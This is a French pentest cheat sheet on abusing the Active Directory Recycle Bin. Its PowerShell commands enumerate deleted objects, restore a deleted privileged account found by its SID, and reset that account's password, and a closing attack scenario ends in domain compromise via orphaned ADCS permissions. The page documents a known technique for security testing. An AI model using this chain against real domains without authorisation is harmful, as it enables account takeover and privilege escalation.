# AD Recycle Bin

### <mark style="color:red;">AD Recycle Bin (Récupération d'objets supprimés)</mark>

#### <mark style="color:green;">Description</mark>

La **Corbeille AD** conserve les objets supprimés pendant une période définie. Un attaquant peut récupérer des comptes privilégiés supprimés qui conservent leurs permissions ADCS ou autres droits.

#### <mark style="color:green;">Prérequis</mark>

* Fonctionnalité Recycle Bin activée dans le domaine
* Privilège **GenericAll** sur l'OU contenant l'objet supprimé
* Ou appartenance au groupe d'administration

#### <mark style="color:green;">Vérification de la Recycle Bin</mark>

```powershell
Get-ADOptionalFeature 'Recycle Bin Feature'
```

#### <mark style="color:green;">Énumération des objets supprimés</mark>

```powershell
# Lister tous les objets supprimés
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property *

# Avec propriétés spécifiques
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent,whenChanged
```

#### <mark style="color:green;">Récupération d'un objet</mark>

```powershell
# Par ObjectGUID
Restore-ADObject -Identity <ObjectGUID>

# Vérification
Get-ADUser <username>
```

#### <mark style="color:green;">Exploitation complète</mark>

```powershell
# 1. Trouver l'objet supprimé avec le bon SID
$deletedObjects = Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -property objectSid
$target = $deletedObjects | Where-Object {$_.objectSid -like "*-1111"}

# 2. Restaurer
Restore-ADObject -Identity $target.ObjectGUID

# 3. Réinitialiser le mot de passe
Set-ADAccountPassword cert_admin -NewPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
```

#### <mark style="color:green;">Scénario d'attaque typique</mark>

1. Énumération ADCS → découverte d'un SID orphelin dans les permissions
2. Vérification AD → le compte n'existe plus
3. Recherche Recycle Bin → le compte est trouvé supprimé
4. Récupération + Reset password → compromission
